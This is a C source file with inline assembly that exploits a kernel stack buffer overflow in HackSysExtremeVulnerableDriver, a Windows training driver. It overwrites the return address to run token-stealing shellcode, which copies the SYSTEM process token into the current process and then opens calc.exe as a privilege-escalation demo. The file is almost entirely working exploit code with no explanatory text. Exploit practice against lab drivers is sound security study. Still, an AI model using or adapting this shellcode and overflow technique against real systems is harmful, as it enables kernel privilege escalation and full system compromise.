//write by Jimp on 2021.7.16
#include <stdio.h>
#include <Windows.h>

#define KTHREAD_OFFSET  0x124
#define EPROCESS_OFFSET 0x050
#define FLINK_OFFSET    0x0b8				//+0x0b8 ActiveProcessLinks : _LIST_ENTRY
#define PID_OFFSET      0x0b4				//+0x0b4 UniqueProcessId    : Ptr32 Void
#define TOKEN_OFFSET    0x0f8				//+0x0f8 Token              : _EX_FAST_REF
#define SYSTEM_PID      0x004

VOID TokenStealingShellcode()
{
	__asm
	{
		; initialize
		pushad;
		mov eax, fs: [KTHREAD_OFFSET] ;		//get current thread
		mov ecx, [eax + EPROCESS_OFFSET];	//get the process
		mov eax, ecx;
		mov ebx, SYSTEM_PID;

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET];	        //get the ActiveProcessLinks
		sub eax, FLINK_OFFSET;
		mov edx, [eax + PID_OFFSET];
		cmp edx, ebx;
		jnz SearchSystemPID;

		mov edx, [eax + TOKEN_OFFSET];
		mov [ecx + TOKEN_OFFSET], edx;

		popad;

		; recovery
		xor eax, eax;			        //return NT_SUCCESS
		add esp, 12;
		pop ebp;
		ret 8;
	}
}

int main()
{
	char buffer[0x824];
	DWORD length = 0;
	HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, 
		0,
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		0);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("failed to open the file……\n");
		return -1;
	}

	printf("get the handle: 0x%x\n", (int)hDevice);

	memset(buffer, 'a', 0x824);
	*(PDWORD)(buffer + 0x820) = (DWORD)TokenStealingShellcode;
	BOOL ret = DeviceIoControl(hDevice,
		0x222003,
		buffer,
		0x824,
		NULL,
		0,
		&length,
		NULL);
	if (!ret)
	{
		printf("failed to send message……\n");
	}
	system("calc.exe");
	CloseHandle(hDevice);
	return 0;
}